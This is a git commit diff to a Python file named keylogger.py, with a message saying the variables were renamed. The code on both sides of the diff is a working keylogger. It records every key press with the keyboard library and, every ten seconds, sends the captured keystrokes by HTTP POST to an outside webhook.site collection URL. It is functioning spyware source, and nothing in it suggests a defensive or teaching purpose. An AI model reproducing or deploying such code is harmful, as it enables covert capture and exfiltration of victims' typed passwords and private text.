65c67fce604a4e97bf3dc3152ae6da1bf4a73923
Frost1801 <sergio.cibecchini@gmail.com>
2024-12-09 14:39:11 +0100

    renamed variables more appropriately

--- keylogger.py
+++ keylogger.py
@@ -3,26 +3,29 @@ import requests
 import json
 import threading
 
-text = ""
+logged_keystrokes = ""
 webhookUrl = "https://webhook.site/5eb26f68-3adb-457a-9706-adf63da9b55c"
-time_interval = 10
+logging_interval = 10
 
 def send_post_req():
-    global text
+    global logged_keystrokes
     try:
-        payload = json.dumps({"Keyboard input": text})
-        r = requests.post(f"{webhookUrl}", data=payload, headers={"Content-Type": "application/json"})
-        text = ""  # Reset the text after sending
-        timer = threading.Timer(time_interval, send_post_req)
+        payload = json.dumps({"Keyboard input": logged_keystrokes})
+        requests.post(f"{webhookUrl}", data=payload, headers={"Content-Type": "application/json"})
+        logged_keystrokes = ""  
+        timer = threading.Timer(logging_interval, send_post_req)
         timer.start()
     except:
         print("Couldn't complete request!")
 
 def log_keys(e):
-    global text
-    text += e.name if len(e.name) == 1 else f"[{e.name}]"
+    global logged_keystrokes
+    if len(e.name) > 1:
+        logged_keystrokes += f"<{e.name}>"
+    else:
+        logged_keystrokes += e.name
 
 keyboard.on_press(log_keys)
 
 send_post_req()
-keyboard.wait()  # Keeps the program running
+keyboard.wait()  
